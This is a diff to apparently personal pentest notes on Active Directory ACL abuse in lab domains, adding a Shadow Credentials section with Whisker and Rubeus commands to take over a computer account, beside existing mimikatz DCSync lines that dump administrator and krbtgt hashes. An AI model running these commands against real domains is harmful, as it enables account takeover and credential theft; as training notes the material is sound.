@@ -88,10 +88,12 @@ bloodhound
 
 1) **Access over User account allows for:**
     - Targeted Kerberoasting: we could `assign them an SPN` and perform a `Kerberoasting attack` (which relies on the target account having a weak password set). [how to do Targeted Kerberoasting](#targeted-kerberoasting)
+    - Shadow Credentials: Use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials.
 2) **Access over Group allows for:**
     - we could `add ourselves` or another `security principal` to a given group [how to Add to group](#add-to-group) .
 3) **Access over Computer user allows for:**
     - we could perform a `Kerberos Resource-based Constrained Delegation` attack.
+    - Shadow Credentials: Use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials.
 
 
 
@@ -103,12 +105,13 @@ bloodhound
 1) **Access over User account allows for:**
    - Change the Target's Password [how to do Change password](#change-password)
    - Targeted Kerberoasting: we could `assign them an SPN` and perform a `Kerberoasting attack` (which relies on the target account having a weak password set).  [how to do Targeted Kerberoasting](#targeted-kerberoasting)
+   - Shadow Credentials: Use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials.
    - Shadow Credentials: Use this technique to impersonate a user 
 2) **Access over Group allows for:**
    - we could `add ourselves` or another `security principal` to a given group. [how to Add to group](#add-to-group)
 3) **Access over Computer user allows for:**
    - we could perform a `Kerberos Resource-based Constrained Delegation` attack.
-   - Shadow Credentials: Use this technique to impersonate a computer
+   - Shadow Credentials: Use this technique to impersonate a computer or user account by exploiting the privileges to create shadow credentials.
   
 ## Get Changes and Get Changes All 
 - The user or service account with this permission ` DS-Replication-Get-Changes-All` and `DS-Replication-Get-Changes` can ask Domain Controllers to replicate all changes in the directory through `Directory Replication Service Remote Protocol (MS-DRSR)` , including those changes that are normally restricted, such as confidential attributes. it cannot be turned off or disabled.
@@ -248,5 +251,22 @@ inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_ha
 .\mimikatz.exe  "privilege::debug" "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator"
 .\mimikatz.exe  "privilege::debug" "lsadump::dcsync /domain:painters.htb /user:painters.htb\krbtgt /all /csv"
 .\mimikatz.exe  "privilege::debug" "lsadump::dcsync /user:painters\matt /history"
+
+```
+
+## Shadow Credentials
+- needed rights : write the `msDS-KeyCredentialLink` attribute
+
+### Exploit 
+we have write right over `ZPH-SVRMGMT1$` computer 
+
+#### Windows
+```powershell
+# use Whisker 
+.\Whisker.exe list /target:ZPH-SVRMGMT1$
+.\Whisker.exe add /target:ZPH-SVRMGMT1$
+
+# Whisker will output similar output for Rubeus
+Rubeus.exe asktgt /user:ZPH-SVRMGMT1$ /certificate:<cert> /password:"2hI2TIOeZevndEXG" /domain:zsm.local /dc:ZPH-SVRDC01.zsm.local /getcredentials /show
 
 ```
